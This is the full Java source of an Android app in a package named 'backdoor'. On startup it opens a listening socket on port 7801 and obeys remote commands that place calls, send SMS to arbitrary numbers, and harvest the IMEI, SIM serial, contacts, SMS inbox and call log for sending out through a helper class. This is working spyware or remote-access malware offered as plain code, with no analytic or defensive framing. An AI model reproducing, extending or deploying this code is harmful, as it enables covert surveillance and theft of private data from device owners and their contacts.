package gasa_soft.ga.backdoor;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;


import java.io.BufferedReader;

import java.io.IOException;
import java.io.InputStreamReader;

import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        Thread mtThread = new Thread(new MyServerThread());
        mtThread.start();
    }

    private class MyServerThread implements Runnable {
        Socket s;
        ServerSocket ss;
        InputStreamReader isr;
        BufferedReader br;
        String msg;
        String str = "";
        Handler h = new Handler();

        @Override
        public void run() {
            try {
                ss = new ServerSocket(7801);

                while (true) {
                    s = ss.accept();
                    isr = new InputStreamReader(s.getInputStream());
                    br = new BufferedReader(isr);
                    msg = br.readLine();
                    ArrayList<String> cmd = getCommand(msg);
                    switch (cmd.get(0)) {
                        case "call": {
                            if (cmd.size() > 1) makeCall(cmd.get(1));
                            msg = "";
                            break;
                        }
                        case "info": {
                            MessageSender messageSender = new MessageSender();
                            messageSender.execute(GetInfoMobile());
                            msg = "";
                            break;
                        }
                        case "info-n": {
                            MessageSender messageSender = new MessageSender();
                            messageSender.execute(GetInfoNetworkMobile());
                            msg = "";
                            break;
                        }
                        case "contact": {
                            MessageSender messageSender = new MessageSender();
                            messageSender.execute(getContacts());
                            msg = "";
                            break;
                        }
                        case "contact-l": {
                            MessageSender messageSender = new MessageSender();
                            messageSender.execute(GetCallDetails());
                            msg = "";
                            break;
                        }
                        case "sms": {
                            MessageSender messageSender = new MessageSender();
                            messageSender.execute(getSms());
                            msg = "";
                            break;
                        }
                        case "sms-s": {
                            if (cmd.size() > 2) {
                                str = "";
                                for (int i = 2; i < cmd.size(); i++) {
                                    str = str + cmd.get(i) + " ";
                                }
                            }
                            SendSms(cmd.get(1), str);
                            msg = "";
                            break;
                        }
                                            }

                    if (cmd.get(0).equals("show")) {
                        str = "";
                        if (cmd.size() > 1) {
                            for (int i = 1; i < cmd.size(); i++) {
                                str = str + cmd.get(i) + " ";
                            }
                        }
                        h.post(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(getApplicationContext(), str, Toast.LENGTH_LONG).show();
                            }
                        });
                    }

                }
            } catch (IOException e) {

            }
        }

        void makeCall(String nbr) {
            String dial = "tel:" + nbr;
            if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            startActivity(new Intent(Intent.ACTION_CALL, Uri.parse(dial)));
        }

        String GetInfoMobile() {

            return "\nDevice: " + Build.DEVICE + "\nModele: " + Build.MODEL + "\nBoard: " + Build.BOARD + "\nBootoader version: " + Build.BOOTLOADER +
                    "\nBrand: " + Build.BRAND + "\nHardware: " + Build.HARDWARE;
        }

        String GetInfoNetworkMobile() {
            TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

            return "\nIMEI number: " + manager.getDeviceId() + "\nSim Serial number: " + manager.getSimSerialNumber()
                    + "\nGet Network country iso: " + manager.getNetworkCountryIso() + "\nGet sim operatorn name: " + manager.getSimOperatorName();
        }

        String getContacts() {
            String contact = "\n";
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.Contacts.DISPLAY_NAME);
            while (c.moveToNext()) {
                contact = contact + "Name: " + c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) +
                        " Number: " + c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n";
            }
            c.close();

            return contact;
        }

        String getSms() {
            String sms = "\n";
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            while (c.moveToNext()) {
                sms = sms + "Number: " + c.getString(c.getColumnIndexOrThrow("address")) +
                        "\nBody: " + c.getString(c.getColumnIndexOrThrow("body")) + "\n";
            }
            c.close();

            return sms;
        }

        void SendSms(String nbr, String body) {

            SmsManager sms_manager = SmsManager.getDefault();
            try {
                sms_manager.sendTextMessage(nbr, null, body, null, null);
            } catch (Exception e) {

            }
        }

        String GetCallDetails() {
            StringBuffer sb = new StringBuffer();
            if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {


            }
            Cursor cursor_managed = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
           int number= cursor_managed.getColumnIndex(CallLog.Calls.NUMBER);
            int type= cursor_managed.getColumnIndex(CallLog.Calls.TYPE);
            int date= cursor_managed.getColumnIndex(CallLog.Calls.DATE);
            int duration= cursor_managed.getColumnIndex(CallLog.Calls.DURATION);
            sb.append("Call Details :\n");
            while(cursor_managed.moveToNext()){
                String phnumber=cursor_managed.getString(number);
                String CallType=cursor_managed.getString(type);
                String CallDate=cursor_managed.getString(date);
                Date callDayTime=new Date(Long.valueOf(CallDate));
                SimpleDateFormat formatter= new SimpleDateFormat("dd-MM-yy HH:mm");
                String dateString =formatter.format(callDayTime);
                String CallDuration=cursor_managed.getString(duration);
                String dir=null;
                switch(Integer.parseInt(CallType)){
                    case CallLog.Calls.OUTGOING_TYPE: dir="OUTGOING";break;
                    case CallLog.Calls.INCOMING_TYPE: dir="INCOMING";break;
                    case CallLog.Calls.MISSED_TYPE: dir="MISSED";break;
                }
               sb.append("Phone number: "+phnumber+" Call type: "+dir+"\n Call date: "+dateString+" Call duration in sec: "+CallDuration);
                sb.append("\n-------------------------------\n");
            }cursor_managed.close();


       return sb.toString();}

        ArrayList<String>  getCommand(String text){
            String s1="";
            ArrayList<String> array=new ArrayList();
            for (int t=0;t<text.length();t++){
                if(text.charAt(t)!=' '){
                    s1=s1+text.charAt(t);
                }else{
                    array.add(s1);s1="";
                }
            }array.add(s1);
            System.out.println(" "+array);
       return array; }



    }


}


